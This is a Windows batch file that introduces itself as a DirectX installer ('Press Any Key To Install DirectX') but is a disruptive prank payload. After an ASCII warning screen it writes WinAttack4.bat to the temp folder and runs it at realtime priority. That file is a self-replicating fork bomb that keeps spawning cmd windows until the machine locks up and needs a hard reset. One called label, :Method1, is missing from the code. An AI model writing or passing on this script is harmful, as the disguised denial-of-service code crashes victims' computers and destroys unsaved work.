@echo off
::::::::::::::::::::::
:: Booting Proccess ::
::::::::::::::::::::::
:: Initiate The Chosen Installs(s)
echo Press Any Key To Install DirectX
pause >nul
:Initiate
mode con: lines=19
color f0
cls
echo.
echo  ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
echo  Û               Û               Û Û   THIS INSTALLATION WILL CRASH THIS PC , Û
echo  Û              ÛÛÛ              Û Û     So Save Any Unsaved Work Before      Û
echo  Û             ÛÛÛÛÛ             Û Û  Advancing. Perform This Attack At YOUR  Û
echo  Û            ÛÛÛÛÛÛÛ            Û Û  OWN RISK! In Order To Get Control Over  Û
echo  Û           ÛÛÛßßßÛÛÛ           Û Û This PC, You Will Have To Hard-Reset It. Û
echo  Û          ÛÛÛÛ   ÛÛÛÛ          Û Û ---------------------------------------- Û
echo  Û         ÛÛÛÛÛ   ÛÛÛÛÛ         Û Û  TO PERFORM A HARD RESET, Hold Down The  Û
echo  Û        ÛÛÛÛÛÛ   ÛÛÛÛÛÛ        Û Û    Power Button On This PC For A Few     Û
echo  Û       ÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛ       Û Û      Seconds, Then Reboot Normally.      Û
echo  Û      ÛÛÛÛÛÛÛÛÜÜÜÛÛÛÛÛÛÛÛ      Û ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
echo  Û     ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ     Û Û                                          Û
echo  Û    ÛÛÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛÛÛÛ    Û Û If You Accept This And Want To Continue, Û
echo  Û   ÛÛÛÛÛÛÛÛÛÛÛ   ÛÛÛÛÛÛÛÛÛÛÛ   Û Û          -PRESS ANY KEY 5 TIMES-         Û
echo  Û  ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ  Û Û           ~~~~~~~~~~~~~~~~~~~~~          Û
echo  Û ßßßßßßßßßßßßßßßßßßßßßßßßßßßßß Û Û                                          Û
echo  ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
call :WAIT
color f7
call :WAIT
color f8
call :WAIT
color 70
call :WAIT
color 80
call :WAIT
color 0C
pushd %temp%
if exist "WinAttack*.bat" del /F /Q WinAttack*.bat >nul 2>&1
set "Start=start /min /realtime "Reboot""
call :Method4
%start% "WinAttack4.bat"
timeout 1 >nul
echo Remember to hold down power button!
popd
timeout 10 >nul
goto :end
:: WinAttack Method 4 -WinAttack Hybrid-
:Method4
call :Method1
(echo ^@echo off
echo title -WINATTACK HYBRID- %WinTitle%
echo %Start% WinAttack1.bat
echo :Fork
echo %Start% cmd^&%Start% %%0^&%Start% %%0
echo goto :Fork)> "WinAttack4.bat"
goto :EOF
:WAIT
ping -ds >nul 2>&1
ping -ds >nul 2>&1
goto :EOF
:end
popd